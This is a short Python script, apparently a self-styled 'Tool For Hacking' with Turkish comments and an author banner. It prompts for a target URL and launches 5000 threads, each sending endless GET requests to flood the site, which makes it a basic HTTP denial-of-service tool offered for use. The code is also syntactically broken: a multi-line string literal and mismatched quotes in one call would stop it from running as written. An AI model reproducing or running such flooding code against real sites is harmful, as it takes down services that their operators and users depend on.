import os
import threading
import requests
import pyfiglet
from termcolor import colored

# Ekranı temizleme fonksiyonu
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Ekranı temizle
clear_screen()

# Büyük ASCII "NPCSLAB" yazısı (Kırmızı)
ascii_banner = pyfiglet.figlet_format("#    ______              _      _           _______
#   |  ____|            (_)    | |         |__   __|
#   | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___
#   |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \
#   | |  \__ \ (_) | (__| |  __/ |_| |_| |    | |  __/ (_| | | | | | |
#   |_|  |___/\___/ \___|_|\___|\__|\__, |    |_|\___|\__,_|_| |_| |_|
#                                    __/ |
#                                   |___/
#
#
#                                Greet's To
#                              IcoDz - G00DYFORGOT
#                             Tool For Hacking
#                             Author : NPC               ")
print(colored(ascii_banner, 'blue'))

# Küçük kırmızı "TikTok: zted_or_npc" yazısı
print(colored("TikTok: zted_or_npc", 'blue'))
print(colored("JUST ADD A HTTP ANY THING",'blue")

# Kullanıcıdan PUT THE LINK HERE al
target_url = input("\nHedef siteyi gir (http:// veya https:// ile): ")

# Aynı anda çalışacak istek sayısı
num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"ATTACKING USING BOT: {response.status_code}")
        except requests.exceptions.RequestException:
            print("SPAMMING REQUEST FROM YOUR PHONE")

# Thread’leri başlat
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Thread’lerin bitmesini bekle
for t in threads:
    t.join()
